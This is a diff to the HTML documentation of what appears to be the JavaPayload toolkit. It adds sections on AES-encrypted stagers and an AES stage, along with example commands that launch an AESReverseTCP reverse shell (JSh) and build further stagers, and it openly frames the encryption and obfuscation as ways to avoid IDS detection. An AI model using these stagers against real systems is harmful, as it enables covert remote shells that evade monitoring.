@@ -120,6 +120,7 @@ on the attacker's machine, which will be uploaded to the temp directory and exec
 <li>Added automated tests and a code coverage report (see the source code for details)</li>
 <li>JarBuilder, AgentJarBuilder, AppletJarBuilder, EmbeddedJarBuilder: Support stripping debug info from classes and giving a custom output filename.</li>
 <li>Add BindUDP/ReverseUDP stagers</li>
+<li>Add AES stagers and an AES stage (for stagers that do not support it)</li>
 </ul>
 
 <h2>Changes since version 0.1</h2>
@@ -368,6 +369,41 @@ for all built-in stagers. To achieve this for other stagers, just wrap them agai
 <p><tt>copy SpawnStagers.jar SpawnStagers2.jar</tt></p>
 <p><tt>set CLASSPATH=SpawnStagers2.jar;%CLASSPATH%</tt></p>
 <p><tt>java javapayload.builder.SpawnStagerBuilder SpawnSomeStager SpawnAnotherStager</tt></p>
+
+<h3>AES stagers</h3>
+
+<p>Java classes on the wire are quite easy to spot (and detect by an IDS); if they slip though,
+trying to chainload (UpExec) native executables might easily be detected. therefore it is
+often advisable to encrypt the whole communication with AES or similar. Therefore, a tool is included
+that can rewrite an existing stager to use AES instead (the name is prefixed by <tt>AES</tt> then). For
+all supported included stagers, AES stagers are already built (While it is not possible build an AES
+stager from a spawn stager, you can build a spawn stager from an AES stager, though).</p>
+
+<p>To use them, add an additional argument <b>to the beginning</b> which is the password used
+to derive the AES key from. The protocol uses the <tt>AES/CFB8/NoPadding</tt> mode with
+random initialization vectors (prepended to the communication). Example:</p> 
+
+<p><tt>java javapayload.handler.stager.StagerHandler AESReverseTCP verysecret localhost # -- JSh</tt></p>
+<p><tt>java javapayload.loader.StandaloneLoader AESReverseTCP verysecret localhost 1687 -- JSh</tt></p>
+
+<p>You can also give "#" as the password, which will print the password to stdout, like ports
+are handled with the ReverseTCP stager.</p>
+
+<p>To build more AES stagers:</p>
+
+<p><tt>java javapayload.builder.AESStagerBuilder SomeStager AnotherStager [...]</tt></p>
+
+<h3>AES stages</h3>
+
+<p>Some stagers cannot be converted to AES stagers, in particular those that are not loaded
+by a standard loader but built-in into a servlet or similar. In that case, an AES stage
+is available, that can be used to dynamically encrypt the communication after the stage
+has been sent. It uses some obfuscation techniques to hide its intents and make it less
+likely to be detected "by accident". Nevertheless, the AES stager class is sent in
+unencrypted form, therefore, if you can, better use the AES stagers.</p>
+
+<p>This stage requires a password as first parameter; the second parameter is the name 
+of the real stage, followed by the real stage arguments.</p>
 
 </body>
 </html>
